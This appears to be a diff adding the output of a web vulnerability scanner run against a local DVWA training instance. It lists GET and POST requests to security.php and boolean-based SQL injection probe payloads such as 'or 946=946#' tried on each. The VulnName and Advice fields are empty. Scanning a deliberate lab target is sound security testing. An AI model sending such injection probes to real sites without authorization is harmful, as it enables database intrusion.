@@ -1,0 +1,22 @@
+Target: http://localhost/dvwa/index.php (GET)
+
+---
+URL:http://localhost/dvwa/security.php (GET)
+VulnName: 
+Query: {'phpids': 'on'}
+Payload: +and+12430=12430
++and+50535=50535
++or+946=946#
++and+12826=12827
+Advice: 
+---
+---
+URL:http://localhost/dvwa/security.php (POST)
+VulnName: 
+Query: {'user_token': '8038b017e045c71d874659bc45753d0a', 'security': 'cntvalue', 'seclev_submit': 'Submit'}
+Payload: +and+12430=12430
++and+50535=50535
++or+946=946#
++and+12826=12827
+Advice: 
+---
